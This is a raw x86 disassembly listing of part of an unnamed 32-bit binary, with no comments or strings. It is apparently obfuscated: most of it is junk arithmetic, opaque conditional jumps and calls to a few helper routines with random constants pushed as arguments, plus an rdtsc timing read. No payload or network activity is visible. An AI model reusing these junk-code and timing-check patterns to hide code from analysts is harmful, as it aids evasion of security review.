  416649:	je     0x416710
  41664f:	mov    esi,DWORD PTR ds:0x42b060
  416655:	and    DWORD PTR [ebp-0x4c],ecx
  416658:	sub    DWORD PTR [ebp-0x4c],edx
  41665b:	mov    ebx,DWORD PTR [ebp-0x1c]
  41665e:	cmp    ebx,0x36
  416661:	je     0x416710
  416667:	xor    edx,edx
  416669:	or     DWORD PTR [ebp-0x1c],edx
  41666c:	mov    esi,0x22
  416671:	test   ebx,0x5b
  416677:	jne    0x416710
  41667d:	mov    ecx,DWORD PTR ds:0x42b088
  416683:	mov    edx,DWORD PTR [ebp-0x4c]
  416686:	cmp    edx,ebx
  416688:	jne    0x416710
  41668e:	mov    esi,DWORD PTR [ebp-0x1c]
  416691:	cmp    edx,0x43
  416694:	jne    0x416710
  416696:	xor    DWORD PTR [ebp-0x4c],esi
  416699:	and    ebx,ecx
  41669b:	mov    ecx,DWORD PTR [ebp-0x4c]
  41669e:	mov    esi,DWORD PTR [ebp-0x4c]
  4166a1:	cmp    edx,0x46
  4166a4:	je     0x416710
  4166a6:	sub    esi,edx
  4166a8:	mov    DWORD PTR [ebp-0x1c],esi
  4166ab:	add    ecx,eax
  4166ad:	add    DWORD PTR [ebp-0x1c],edx
  4166b0:	mov    esi,DWORD PTR [ebp-0x4c]
  4166b3:	mov    edx,ebx
  4166b5:	or     DWORD PTR [ebp-0x4c],ecx
  4166b8:	or     DWORD PTR [ebp-0x1c],edi
  4166bb:	mov    DWORD PTR [ebp-0x4],ebx
  4166be:	add    DWORD PTR [ebp-0x4c],edx
  4166c1:	cmp    esi,edi
  4166c3:	jne    0x416710
  4166c5:	cmp    esi,DWORD PTR [ebp-0x8]
  4166c8:	jne    0x416710
  4166ca:	sub    esi,ebx
  4166cc:	cmp    esi,0x4
  4166cf:	je     0x416710
  4166d1:	mov    ebx,0xe9
  4166d6:	mov    edx,0x30
  4166db:	cmp    eax,DWORD PTR ds:0x42b060
  4166e1:	je     0x416710
  4166e3:	or     ebx,esi
  4166e5:	sub    edx,eax
  4166e7:	mov    ecx,0xa230908a
  4166ec:	xor    esi,esi
  4166ee:	and    edx,esi
  4166f0:	add    edx,ecx
  4166f2:	test   ebx,0x20
  4166f8:	jne    0x416710
  4166fa:	mov    esi,ebx
  4166fc:	mov    ecx,0x1821c693
  416701:	sub    DWORD PTR [ebp-0x4c],edx
  416704:	and    esi,edi
  416706:	and    esi,eax
  416708:	and    esi,edx
  41670a:	sub    DWORD PTR [ebp-0x4c],esi
  41670d:	sub    DWORD PTR [ebp-0x4],ecx
  416710:	cmp    edi,eax
  416712:	je     0x416947
  416718:	call   0x41798a
  41671d:	push   0xffffff95
  41671f:	push   0xffffff91
  416721:	call   0x4177cb
  416726:	add    esp,0x8
  416729:	push   0x42b054
  41672e:	call   DWORD PTR ds:0x414d78
  416734:	add    esi,esi
  416736:	mov    edx,0x7f
  41673b:	mov    edi,DWORD PTR [ebp-0x4c]
  41673e:	test   esi,0xd0
  416744:	jne    0x416764
  416746:	mov    ecx,DWORD PTR [ebp-0x4c]
  416749:	add    DWORD PTR [ebp-0x4c],edx
  41674c:	mov    ebx,DWORD PTR [ebp-0x1c]
  41674f:	mov    DWORD PTR [ebp-0x1c],ebx
  416752:	cmp    esi,edi
  416754:	jne    0x416764
  416756:	add    DWORD PTR [ebp-0x4c],ecx
  416759:	cmp    esi,DWORD PTR [ebp-0x30]
  41675c:	jne    0x416764
  41675e:	or     DWORD PTR [ebp-0x1c],esi
  416761:	add    DWORD PTR [ebp-0x1c],edi
  416764:	or     eax,eax
  416766:	je     0x416947
  41676c:	and    ebx,eax
  41676e:	add    DWORD PTR [ebp-0x1c],ebx
  416771:	add    DWORD PTR [ebp-0x54],0x5a1997dc
  416778:	mov    ebx,DWORD PTR [ebp-0x4c]
  41677b:	sub    DWORD PTR [ebp-0x1c],ebx
  41677e:	lea    edi,[eax+0x731]
  416784:	mov    ecx,DWORD PTR ds:0x42b07c
  41678a:	push   0xffffff96
  41678c:	push   0xd64d6c00
  416791:	push   0x5a4bd600
  416796:	push   0x4200db00
  41679b:	call   0x417ddd
  4167a0:	add    esp,0x10
  4167a3:	call   0x4177cb
  4167a8:	inc    edi
  4167a9:	push   0x6b
  4167ab:	push   0xc2fe2000
  4167b0:	push   0x12413600
  4167b5:	push   0xffffffaf
  4167b7:	call   0x417c22
  4167bc:	add    esp,0x10
  4167bf:	call   0x4177cb
  4167c4:	mov    eax,DWORD PTR [edi]
  4167c6:	mov    ebx,DWORD PTR [ebp-0x4c]
  4167c9:	cmp    eax,0x20
  4167cc:	je     0x4167fa
  4167ce:	mov    edx,DWORD PTR [ebp-0x1c]
  4167d1:	mov    esi,edx
  4167d3:	cmp    ebx,DWORD PTR [ebp-0x38]
  4167d6:	je     0x4167fa
  4167d8:	add    ebx,edi
  4167da:	mov    ecx,DWORD PTR [ebp-0x4c]
  4167dd:	mov    edx,0x1e06
  4167e2:	add    DWORD PTR [ebp-0x4c],eax
  4167e5:	sub    DWORD PTR [ebp-0x1c],esi
  4167e8:	or     DWORD PTR [ebp-0x1c],ebx
  4167eb:	cmp    ecx,DWORD PTR [ebp-0x14]
  4167ee:	je     0x4167f3
  4167f0:	add    DWORD PTR [ebp-0x1c],ecx
  4167f3:	cmp    esi,ebx
  4167f5:	je     0x4167fa
  4167f7:	mov    DWORD PTR [ebp-0x1c],edx
  4167fa:	sub    eax,0x5a5685c9
  4167ff:	mov    edx,0x416d
  416804:	mov    ebx,ecx
  416806:	add    DWORD PTR [ebp-0x4c],eax
  416809:	or     edx,ebx
  41680b:	sub    edx,ebx
  41680d:	add    edx,edx
  41680f:	or     edx,eax
  416811:	cmp    edx,DWORD PTR ds:0x42b07c
  416817:	jne    0x416876
  416819:	and    edx,esi
  41681b:	mov    ecx,DWORD PTR [ebp-0x4c]
  41681e:	test   ecx,0x44
  416824:	jne    0x416876
  416826:	mov    esi,DWORD PTR [ebp-0x4c]
  416829:	mov    ebx,DWORD PTR [ebp-0x1c]
  41682c:	test   edx,0xfd36
  416832:	je     0x416876
  416834:	cmp    esi,DWORD PTR [ebp-0x30]
  416837:	jne    0x416876
  416839:	add    DWORD PTR [ebp-0x4c],edx
  41683c:	mov    edx,DWORD PTR ds:0x42b070
  416842:	sub    DWORD PTR [ebp-0x1c],ebx
  416845:	add    DWORD PTR [ebp-0x4c],esi
  416848:	xor    DWORD PTR [ebp-0x1c],ecx
  41684b:	sub    edx,ebx
  41684d:	cmp    edx,0x67
  416850:	jne    0x416876
  416852:	cmp    edx,0x57
  416855:	je     0x416876
  416857:	mov    ebx,DWORD PTR ds:0x42b074
  41685d:	add    ebx,ebx
  41685f:	mov    ecx,0x2f
  416864:	sub    ebx,esi
  416866:	sub    DWORD PTR [ebp-0x1c],edx
  416869:	add    DWORD PTR [ebp-0x4c],ebx
  41686c:	and    ecx,esi
  41686e:	cmp    ecx,DWORD PTR [ebp-0x4c]
  416871:	je     0x416876
  416873:	sub    DWORD PTR [ebp-0x4c],ecx
  416876:	cmp    eax,0x1ba8cb4f
  41687b:	jne    0x416784
  416881:	xor    ebx,ebx
  416883:	sub    ebx,eax
  416885:	push   0xffffffb7
  416887:	push   0x2e
  416889:	call   0x417eff
  41688e:	add    esp,0x8
  416891:	mov    esi,DWORD PTR [ebp-0x1c]
  416894:	push   0x18d91000
  416899:	call   0x417eff
  41689e:	add    esp,0x4
  4168a1:	push   0x462bbd00
  4168a6:	push   0x53
  4168a8:	call   0x417ddd
  4168ad:	add    esp,0x8
  4168b0:	push   0x59
  4168b2:	push   0x7f
  4168b4:	call   0x417c22
  4168b9:	add    esp,0x8
  4168bc:	push   0x16731d00
  4168c1:	push   0xb20c3b00
  4168c6:	call   0x417ddd
  4168cb:	add    esp,0x8
  4168ce:	add    ebx,edi
  4168d0:	push   0x16533500
  4168d5:	push   0x58ced300
  4168da:	push   0xffffffe9
  4168dc:	call   0x417c22
  4168e1:	add    esp,0xc
  4168e4:	push   0xa2007100
  4168e9:	push   0x15
  4168eb:	push   0xe22e1a00
  4168f0:	call   0x417eff
  4168f5:	add    esp,0xc
  4168f8:	cmp    ebx,DWORD PTR [ebp-0x34]
  4168fb:	jne    0x41693e
  4168fd:	or     ebx,edi
  4168ff:	push   0xffffffa7
  416901:	call   0x41798a
  416906:	add    esp,0x4
  416909:	push   0x4676d000
  41690e:	call   0x417c22
  416913:	add    esp,0x4
  416916:	push   0x8a37a200
  41691b:	push   0xffffffa6
  41691d:	call   0x4177cb
  416922:	add    esp,0x8
  416925:	cmp    esi,DWORD PTR ds:0x42b07c
  41692b:	jne    0x41693e
  41692d:	add    ebx,ebx
  41692f:	call   0x4177cb
  416934:	sub    esi,eax
  416936:	and    ebx,eax
  416938:	sub    DWORD PTR [ebp-0x4c],ebx
  41693b:	add    DWORD PTR [ebp-0x4c],esi
  41693e:	mov    eax,DWORD PTR [edi+0x4]
  416941:	add    DWORD PTR [ebp-0x4c],edi
  416944:	sub    DWORD PTR [ebp-0x54],eax
  416947:	add    DWORD PTR [ebp-0x4c],ebx
  41694a:	mov    eax,DWORD PTR ds:0x42b060
  416950:	mov    esi,DWORD PTR [ebp-0x4c]
  416953:	and    eax,edi
  416955:	cmp    esi,0xffffffb5
  416958:	je     0x416b73
  41695e:	mov    edi,DWORD PTR [ebp-0x1c]
  416961:	mov    DWORD PTR [ebp-0x4c],edi
  416964:	cmp    eax,DWORD PTR [ebp-0x28]
  416967:	je     0x416b73
  41696d:	mov    edi,DWORD PTR [ebp-0x4c]
  416970:	add    eax,edi
  416972:	test   eax,0x78
  416977:	jne    0x416b73
  41697d:	push   0x9e1bb500
  416982:	call   0x417c22
  416987:	add    esp,0x4
  41698a:	push   0x3b
  41698c:	call   0x417ddd
  416991:	add    esp,0x4
  416994:	mov    edi,0x3344
  416999:	mov    edx,0xd
  41699e:	push   0xffffffc0
  4169a0:	call   0x41798a
  4169a5:	add    esp,0x4
  4169a8:	call   0x41798a
  4169ad:	cmp    esi,DWORD PTR [ebp-0x20]
  4169b0:	je     0x416b73
  4169b6:	and    esi,ebx
  4169b8:	push   0xc274cf00
  4169bd:	push   0x47
  4169bf:	push   0xffffffed
  4169c1:	push   0x2d
  4169c3:	push   0xe653fc00
  4169c8:	call   0x417eff
  4169cd:	add    esp,0x14
  4169d0:	push   0x2b1d400
  4169d5:	call   0x417eff
  4169da:	add    esp,0x4
  4169dd:	mov    edx,DWORD PTR [ebp-0x4c]
  4169e0:	mov    ebx,DWORD PTR [ebp-0x1c]
  4169e3:	add    DWORD PTR [ebp-0x1c],esi
  4169e6:	cmp    edx,0xffffffbb
  4169e9:	je     0x416b73
  4169ef:	sub    edi,eax
  4169f1:	push   0x42e30200
  4169f6:	push   0xfffffffd
  4169f8:	push   0xffffffe0
  4169fa:	push   0xfad2ed00
  4169ff:	call   0x417ddd
  416a04:	add    esp,0x10
  416a07:	push   0x67
  416a09:	push   0x58
  416a0b:	push   0xffffffba
  416a0d:	push   0xfab3f900
  416a12:	push   0x4f
  416a14:	call   0x41798a
  416a19:	add    esp,0x14
  416a1c:	push   0x51
  416a1e:	call   0x417ddd
  416a23:	add    esp,0x4
  416a26:	push   0xa24b500
  416a2b:	call   0x417c22
  416a30:	add    esp,0x4
  416a33:	push   0x44
  416a35:	push   0x42
  416a37:	call   0x41798a
  416a3c:	add    esp,0x8
  416a3f:	mov    esi,eax
  416a41:	add    DWORD PTR [ebp-0x4c],esi
  416a44:	push   0x25
  416a46:	call   0x417ddd
  416a4b:	add    esp,0x4
  416a4e:	call   0x417ddd
  416a53:	push   0xffffff85
  416a55:	push   0xffffff91
  416a57:	call   0x417c22
  416a5c:	add    esp,0x8
  416a5f:	cmp    ebx,0xffffffe7
  416a62:	jne    0x416b73
  416a68:	push   0xbe540a00
  416a6d:	push   0x6e7c4300
  416a72:	push   0xffffffc4
  416a74:	push   0xffffff91
  416a76:	push   0x880aa00
  416a7b:	call   0x417ddd
  416a80:	add    esp,0x14
  416a83:	call   0x4177cb
  416a88:	push   0x35
  416a8a:	push   0x42ddae00
  416a8f:	push   0x5acb9e00
  416a94:	push   0xb8e6a100
  416a99:	call   0x417c22
  416a9e:	add    esp,0x10
  416aa1:	mov    esi,DWORD PTR [ebp-0x1c]
  416aa4:	add    esi,eax
  416aa6:	push   0x6a
  416aa8:	push   0x5af50c00
  416aad:	push   0x123b8d00
  416ab2:	call   0x4177cb
  416ab7:	add    esp,0xc
  416aba:	add    DWORD PTR [ebp-0x4c],ebx
  416abd:	push   0xffffffed
  416abf:	push   0x3e
  416ac1:	push   0x38
  416ac3:	push   0x2e1fb400
  416ac8:	push   0xc8bc7e00
  416acd:	call   0x41798a
  416ad2:	add    esp,0x14
  416ad5:	call   0x417eff
  416ada:	and    edi,ebx
  416adc:	mov    ecx,0x36
  416ae1:	push   0xffffff84
  416ae3:	push   0xffffff97
  416ae5:	call   0x4177cb
  416aea:	add    esp,0x8
  416aed:	add    DWORD PTR [ebp-0x4c],edi
  416af0:	add    esi,ebx
  416af2:	push   0x4885b100
  416af7:	push   0xc2c2f800
  416afc:	push   0x49
  416afe:	push   0xffffffd7
  416b00:	push   0x67
  416b02:	call   0x417c22
  416b07:	add    esp,0x14
  416b0a:	push   0x7c
  416b0c:	push   0x70
  416b0e:	push   0x16278500
  416b13:	push   0xffffffca
  416b15:	call   0x417eff
  416b1a:	add    esp,0x10
  416b1d:	push   0x2e48b000
  416b22:	push   0x1e21fd00
  416b27:	push   0x5ac9da00
  416b2c:	push   0xffffffc2
  416b2e:	call   0x417c22
  416b33:	add    esp,0x10
  416b36:	add    esi,esi
  416b38:	sub    esi,eax
  416b3a:	push   0x2e636d00
  416b3f:	push   0xd60dc500
  416b44:	push   0xfa872e00
  416b49:	call   0x4177cb
  416b4e:	add    esp,0xc
  416b51:	sub    DWORD PTR [ebp-0x4c],ebx
  416b54:	call   0x417ddd
  416b59:	push   0x59
  416b5b:	call   0x417c22
  416b60:	add    esp,0x4
  416b63:	push   0x78feb300
  416b68:	call   0x41798a
  416b6d:	add    esp,0x4
  416b70:	add    DWORD PTR [ebp-0x1c],esi
  416b73:	mov    edx,DWORD PTR [ebp+0xc]
  416b76:	cmp    eax,ebx
  416b78:	jne    0x416bb0
  416b7a:	mov    eax,edi
  416b7c:	add    eax,esi
  416b7e:	add    eax,edx
  416b80:	cmp    eax,edi
  416b82:	je     0x416bb0
  416b84:	mov    edi,DWORD PTR [ebp-0x1c]
  416b87:	or     DWORD PTR [ebp-0x1c],eax
  416b8a:	mov    eax,edx
  416b8c:	add    edi,edi
  416b8e:	sub    DWORD PTR [ebp-0x4c],edi
  416b91:	add    DWORD PTR [ebp-0x1c],edi
  416b94:	cmp    eax,0xffffff8a
  416b97:	je     0x416bb0
  416b99:	mov    esi,DWORD PTR [ebp-0x4c]
  416b9c:	add    DWORD PTR [ebp-0x4c],esi
  416b9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  416ba2:	sub    DWORD PTR [ebp-0x1c],eax
  416ba5:	cmp    ebx,esi
  416ba7:	je     0x416bb0
  416ba9:	add    ebx,edi
  416bab:	or     ebx,esi
  416bad:	sub    DWORD PTR [ebp-0x1c],ebx
  416bb0:	mov    ecx,DWORD PTR [ebp-0x54]
  416bb3:	mov    esi,DWORD PTR [ebp-0x1c]
  416bb6:	mov    eax,DWORD PTR ds:0x42b068
  416bbc:	cmp    ecx,DWORD PTR [ebp-0x38]
  416bbf:	jne    0x416bf8
  416bc1:	mov    edi,ebx
  416bc3:	mov    ebx,ecx
  416bc5:	mov    DWORD PTR [ebp-0x1c],esi
  416bc8:	cmp    edi,ebx
  416bca:	je     0x416bf8
  416bcc:	sub    eax,esi
  416bce:	cmp    edi,0x20
  416bd1:	je     0x416bf8
  416bd3:	add    DWORD PTR [ebp-0x4c],ebx
  416bd6:	mov    ebx,0xa9
  416bdb:	mov    esi,DWORD PTR [ebp-0x4c]
  416bde:	add    DWORD PTR [ebp-0x1c],esi
  416be1:	and    eax,ebx
  416be3:	cmp    edi,ebx
  416be5:	jne    0x416bf8
  416be7:	add    DWORD PTR [ebp-0x4c],edi
  416bea:	add    eax,ecx
  416bec:	xor    edi,edi
  416bee:	cmp    eax,edx
  416bf0:	jne    0x416bf8
  416bf2:	add    DWORD PTR [ebp-0x1c],eax
  416bf5:	add    DWORD PTR [ebp-0x4c],edi
  416bf8:	mov    DWORD PTR [edx+0x0],ecx
  416bfb:	push   0xffffffd2
  416bfd:	push   0xc8b3ef00
  416c02:	push   0x265d0600
  416c07:	call   0x4177cb
  416c0c:	add    esp,0xc
  416c0f:	push   0x5af72200
  416c14:	push   0x58e1f100
  416c19:	push   0x38c74700
  416c1e:	call   0x417c22
  416c23:	add    esp,0xc
  416c26:	pop    edi
  416c27:	cmp    edi,eax
  416c29:	je     0x416c37
  416c2b:	push   0xffffffa5
  416c2d:	push   0x2a
  416c2f:	call   0x417c22
  416c34:	add    esp,0x8
  416c37:	pop    esi
  416c38:	push   0x52
  416c3a:	push   0x1e013b00
  416c3f:	push   0xfffffffc
  416c41:	call   0x417c22
  416c46:	add    esp,0xc
  416c49:	pop    ebx
  416c4a:	push   0x76594500
  416c4f:	push   0x76440e00
  416c54:	call   0x41798a
  416c59:	add    esp,0x8
  416c5c:	leave  
  416c5d:	ret    0x8
  416c60:	int3   
  416c61:	int3   
  416c62:	int3   
  416c63:	int3   
  416c64:	int3   
  416c65:	push   ebp
  416c66:	mov    ebp,esp
  416c68:	sub    esp,0x38
  416c6b:	push   0xffffffc7
  416c6d:	call   0x417ddd
  416c72:	add    esp,0x4
  416c75:	push   0xffffffee
  416c77:	push   0x3a51dc00
  416c7c:	call   0x417c22
  416c81:	add    esp,0x8
  416c84:	push   ebx
  416c85:	mov    ebx,0x8154
  416c8a:	push   0x3a4ab100
  416c8f:	push   0xffffffc7
  416c91:	push   0xfaad5000
  416c96:	push   0x2dcf800
  416c9b:	call   0x417eff
  416ca0:	add    esp,0x10
  416ca3:	mov    DWORD PTR [ebp-0x24],ebx
  416ca6:	push   0xffffffc4
  416ca8:	push   0xffffffb0
  416caa:	push   0x1a
  416cac:	call   0x417c22
  416cb1:	add    esp,0xc
  416cb4:	push   esi
  416cb5:	push   0x21
  416cb7:	call   0x417eff
  416cbc:	add    esp,0x4
  416cbf:	push   0x43
  416cc1:	push   0x42c41e00
  416cc6:	push   0x32447600
  416ccb:	call   0x417ddd
  416cd0:	add    esp,0xc
  416cd3:	push   edi
  416cd4:	push   0x689c1c00
  416cd9:	push   0x61
  416cdb:	push   0xffffffc7
  416cdd:	call   0x417eff
  416ce2:	add    esp,0xc
  416ce5:	push   0x262b1900
  416cea:	push   0xc2d71100
  416cef:	push   0xea7b2200
  416cf4:	push   0x1d
  416cf6:	push   0xffffffeb
  416cf8:	call   0x41798a
  416cfd:	add    esp,0x14
  416d00:	mov    ecx,0x5a
  416d05:	mov    edi,0x8c
  416d0a:	push   0xf25f9200
  416d0f:	push   0x1230e700
  416d14:	call   0x41798a
  416d19:	add    esp,0x8
  416d1c:	sub    edi,eax
  416d1e:	push   0x77
  416d20:	push   0xffffffdd
  416d22:	push   0xb259c600
  416d27:	push   0x22051700
  416d2c:	call   0x4177cb
  416d31:	add    esp,0x10
  416d34:	push   0x38f8d200
  416d39:	push   0x11
  416d3b:	call   0x417ddd
  416d40:	add    esp,0x8
  416d43:	push   0x58
  416d45:	push   0x825ab100
  416d4a:	push   0x70
  416d4c:	call   0x417eff
  416d51:	add    esp,0xc
  416d54:	push   0xfffffff8
  416d56:	push   0x284c200
  416d5b:	call   0x417ddd
  416d60:	add    esp,0x8
  416d63:	push   0xffffffd4
  416d65:	push   0x68ce4700
  416d6a:	push   0x54
  416d6c:	push   0x66
  416d6e:	call   0x4177cb
  416d73:	add    esp,0x10
  416d76:	push   0xffffff97
  416d78:	push   0x3e60ef00
  416d7d:	push   0xb2767700
  416d82:	push   0xc219d500
  416d87:	push   0x38b39d00
  416d8c:	call   0x417c22
  416d91:	add    esp,0x14
  416d94:	push   0x3e481600
  416d99:	push   0xffffffb4
  416d9b:	push   0xffffffc3
  416d9d:	push   0xffffffab
  416d9f:	call   0x4177cb
  416da4:	add    esp,0x10
  416da7:	push   0xfffffff8
  416da9:	push   0x18a62200
  416dae:	push   0x7c
  416db0:	push   0x10
  416db2:	call   0x41798a
  416db7:	add    esp,0x10
  416dba:	cmp    edi,0x71
  416dbd:	je     0x416dda
  416dbf:	mov    ebx,edi
  416dc1:	push   0xca3f7300
  416dc6:	push   0x66
  416dc8:	push   0x288f9700
  416dcd:	push   0x64
  416dcf:	call   0x417ddd
  416dd4:	add    esp,0x10
  416dd7:	add    DWORD PTR [ebp-0x24],ebx
  416dda:	push   0xffffff99
  416ddc:	call   0x41798a
  416de1:	add    esp,0x4
  416de4:	call   0x417ddd
  416de9:	rdtsc  
  416deb:	mov    ecx,DWORD PTR [ebp-0x24]
  416dee:	mov    esi,DWORD PTR [ebp-0x24]
  416df1:	sub    DWORD PTR [ebp-0x24],edx
  416df4:	test   esi,0x77
  416dfa:	je     0x416e2a
  416dfc:	mov    edi,0x37
  416e01:	mov    ebx,0x67
  416e06:	add    DWORD PTR [ebp-0x24],ecx
  416e09:	add    edi,edi
  416e0b:	sub    DWORD PTR [ebp-0x24],esi
  416e0e:	sub    edi,edx
  416e10:	add    DWORD PTR [ebp-0x24],eax
  416e13:	add    edi,ebx
  416e15:	sub    edi,esi
  416e17:	add    edi,edi
  416e19:	or     edi,edx
  416e1b:	test   edi,0x6a99
  416e21:	je     0x416e2a
  416e23:	add    edi,ebx
  416e25:	and    edi,eax
  416e27:	add    DWORD PTR [ebp-0x24],edi
  416e2a:	sub    DWORD PTR [ebp-0x24],edx
  416e2d:	mov    esi,DWORD PTR [ebp-0x24]
  416e30:	add    DWORD PTR [ebp-0x24],esi
  416e33:	pop    edi
  416e34:	cmp    edi,0xfffffffc
  416e37:	jne    0x416ec4
  416e3d:	mov    ebx,0x8e
  416e42:	mov    edx,DWORD PTR [ebp-0x24]
  416e45:	test   edi,0x37
  416e4b:	jne    0x416ec4
  416e4d:	mov    ecx,0x5b
  416e52:	mov    esi,DWORD PTR [ebp-0x24]
  416e55:	add    ebx,edi
  416e57:	cmp    ebx,0x49
  416e5a:	je     0x416ec4
  416e5c:	sub    DWORD PTR [ebp-0x24],edx
  416e5f:	mov    edx,DWORD PTR [ebp-0x24]
  416e62:	cmp    edx,0x1d5
  416e68:	jne    0x416ec4
  416e6a:	sub    ecx,ebx
  416e6c:	cmp    ebx,0xfffffff6
  416e6f:	jne    0x416ec4
  416e71:	add    ecx,esi
  416e73:	add    ecx,edi
  416e75:	cmp    ecx,0x8917
  416e7b:	jne    0x416ec4
  416e7d:	and    ecx,eax
  416e7f:	test   ecx,0x6
  416e85:	jne    0x416ec4
  416e87:	add    ecx,esi
  416e89:	mov    ebx,DWORD PTR [ebp-0x24]
  416e8c:	and    edx,esi
  416e8e:	mov    esi,DWORD PTR [ebp-0x24]
  416e91:	sub    edx,edi
  416e93:	test   edx,0xd
  416e99:	je     0x416ec4
  416e9b:	xor    DWORD PTR [ebp-0x24],edx
  416e9e:	or     DWORD PTR [ebp-0x24],eax
  416ea1:	mov    edx,0x9c
  416ea6:	add    DWORD PTR [ebp-0x24],ebx
  416ea9:	sub    esi,ebx
  416eab:	sub    esi,eax
  416ead:	mov    DWORD PTR [ebp-0x24],esi
  416eb0:	cmp    edi,esi
  416eb2:	je     0x416ec4
  416eb4:	mov    esi,eax
  416eb6:	sub    ecx,edi
  416eb8:	sub    DWORD PTR [ebp-0x24],esi
  416ebb:	xor    ebx,ebx
  416ebd:	sub    ecx,ebx
  416ebf:	sub    edx,ecx
  416ec1:	add    DWORD PTR [ebp-0x24],edx
  416ec4:	pop    esi
  416ec5:	mov    ecx,DWORD PTR [ebp-0x24]
  416ec8:	mov    edx,DWORD PTR [ebp-0x24]
  416ecb:	cmp    ecx,DWORD PTR [ebp-0x24]
  416ece:	je     0x416f09
  416ed0:	or     DWORD PTR [ebp-0x24],esi
  416ed3:	mov    ebx,DWORD PTR [ebp-0x24]
  416ed6:	cmp    ebx,0x1c
  416ed9:	jne    0x416f09
  416edb:	sub    DWORD PTR [ebp-0x24],eax
  416ede:	add    ebx,esi
  416ee0:	cmp    edi,edx
  416ee2:	jne    0x416f09
  416ee4:	xor    DWORD PTR [ebp-0x24],ecx
  416ee7:	add    ebx,eax
  416ee9:	sub    edx,eax
  416eeb:	xor    ecx,ecx
  416eed:	mov    DWORD PTR [ebp-0x24],edx
  416ef0:	and    ebx,edi
  416ef2:	test   ebx,0xf4
  416ef8:	je     0x416f09
  416efa:	mov    edx,0x8b
  416eff:	sub    DWORD PTR [ebp-0x24],ecx
  416f02:	or     edx,ebx
  416f04:	or     edx,eax
  416f06:	add    DWORD PTR [ebp-0x24],edx
  416f09:	pop    ebx
  416f0a:	and    edx,ecx
  416f0c:	mov    ecx,DWORD PTR [ebp-0x24]
  416f0f:	or     DWORD PTR [ebp-0x24],edi
  416f12:	sub    ecx,edi
  416f14:	and    DWORD PTR [ebp-0x24],ebx
  416f17:	sub    ecx,eax
  416f19:	cmp    edx,DWORD PTR [ebp-0x18]
  416f1c:	je     0x416f30
  416f1e:	sub    DWORD PTR [ebp-0x24],ecx
  416f21:	mov    ecx,0xa019
  416f26:	add    edx,edi
  416f28:	sub    edx,esi
  416f2a:	sub    DWORD PTR [ebp-0x24],edx
  416f2d:	add    DWORD PTR [ebp-0x24],ecx
  416f30:	leave  
  416f31:	ret    
  416f32:	int3   
  416f33:	int3   
  416f34:	int3   
  416f35:	int3   
  416f36:	int3   
  416f37:	push   ebp
  416f38:	mov    ebp,esp
  416f3a:	sub    esp,0x20
  416f3d:	call   0x41798a
  416f42:	push   0xffffffa6
  416f44:	push   0x4d
  416f46:	call   0x417eff
  416f4b:	add    esp,0x8
  416f4e:	push   ebx
  416f4f:	call   0x417c22
  416f54:	push   0x5d
  416f56:	push   0xde4e0100
  416f5b:	call   0x417c22
  416f60:	add    esp,0x8
  416f63:	push   esi
  416f64:	xor    esi,esi
  416f66:	push   0x32
  416f68:	call   0x41798a
  416f6d:	add    esp,0x4
  416f70:	call   0x417c22
  416f75:	push   0xffffffb5
  416f77:	call   0x417eff
  416f7c:	add    esp,0x4
  416f7f:	or     esi,eax
  416f81:	add    esi,esi
  416f83:	sub    esi,eax
  416f85:	mov    edx,0x9ad7
  416f8a:	push   0x48
  416f8c:	push   0x2e65500
  416f91:	push   0x24ae300
  416f96:	push   0xffffff9e
  416f98:	call   0x4177cb
  416f9d:	add    esp,0x10
  416fa0:	push   0xffffff82
  416fa2:	push   0x4f
  416fa4:	call   0x417ddd
  416fa9:	add    esp,0x8
  416fac:	push   0x44
  416fae:	push   0x68f07700
  416fb3:	push   0xf640fd00
  416fb8:	push   0xc288c200
  416fbd:	push   0xffffffe0
  416fbf:	call   0x417ddd
  416fc4:	add    esp,0x14
  416fc7:	call   0x417c22
  416fcc:	or     esi,eax
  416fce:	mov    DWORD PTR [ebp-0x1c],esi
  416fd1:	push   0x19
  416fd3:	push   0x96405b00
  416fd8:	push   0x60
  416fda:	push   0x7a023000
  416fdf:	call   0x41798a
  416fe4:	add    esp,0x10
  416fe7:	push   edi
  416fe8:	push   0x5ac74a00
  416fed:	push   0xffffffc8
  416fef:	push   0x188c8500
  416ff4:	call   0x4177cb
  416ff9:	add    esp,0xc
  416ffc:	push   0x1e150700
  417001:	push   0xffffffe0
  417003:	push   0x827c5d00
  417008:	push   0x1a
  41700a:	push   0xc8df7100
  41700f:	call   0x4177cb
  417014:	add    esp,0x14
  417017:	xor    edx,edx
  417019:	call   0x417ddd
  41701e:	call   0x417ddd
  417023:	mov    eax,DWORD PTR [ebp+0x10]
  417026:	add    esi,eax
  417028:	cmp    esi,DWORD PTR [ebp-0x18]
  41702b:	jne    0x417059
  41702d:	mov    ebx,eax
  41702f:	mov    ecx,0xddce
  417034:	or     ebx,eax
  417036:	cmp    esi,0xcef3
  41703c:	jne    0x417059
  41703e:	mov    edx,0x9f63
  417043:	sub    DWORD PTR [ebp-0x1c],edx
  417046:	sub    ebx,esi
  417048:	sub    ebx,esi
  41704a:	mov    edi,DWORD PTR [ebp-0x1c]
  41704d:	add    ecx,edi
  41704f:	or     DWORD PTR [ebp-0x1c],ecx
  417052:	sub    ebx,edx
  417054:	or     ebx,edi
  417056:	sub    DWORD PTR [ebp-0x1c],ebx
  417059:	mov    ecx,DWORD PTR [ebp+0x8]
  41705c:	mov    edi,DWORD PTR [ebp-0x1c]
  41705f:	mov    edx,DWORD PTR [ebp-0x1c]
  417062:	sub    DWORD PTR [ebp-0x1c],eax
  417065:	add    DWORD PTR [ebp-0x1c],ebx
  417068:	sub    edx,eax
  41706a:	sub    edi,eax
  41706c:	sub    DWORD PTR [ebp-0x1c],edx
  41706f:	sub    DWORD PTR [ebp-0x1c],edi
  417072:	cmp    DWORD PTR [ebp+0xc],eax
  417075:	je     0x417145
  41707b:	xor    edi,edi
  41707d:	sub    edi,ebx
  41707f:	mov    esi,DWORD PTR [ebp-0x1c]
  417082:	cmp    ecx,0xffffffe7
  417085:	jne    0x4170c7
  417087:	mov    edx,DWORD PTR [ebp-0x1c]
  41708a:	cmp    eax,0xffffffe9
  41708d:	je     0x4170c7
  41708f:	cmp    edi,DWORD PTR [ebp-0x10]
  417092:	jne    0x4170c7
  417094:	and    DWORD PTR [ebp-0x1c],eax
  417097:	add    edi,edi
  417099:	cmp    ecx,DWORD PTR [ebp-0x20]
  41709c:	jne    0x4170c7
  41709e:	test   edx,0x2b
  4170a4:	je     0x4170c7
  4170a6:	sub    esi,eax
  4170a8:	test   edi,0xf5
  4170ae:	je     0x4170c7
  4170b0:	and    esi,edx
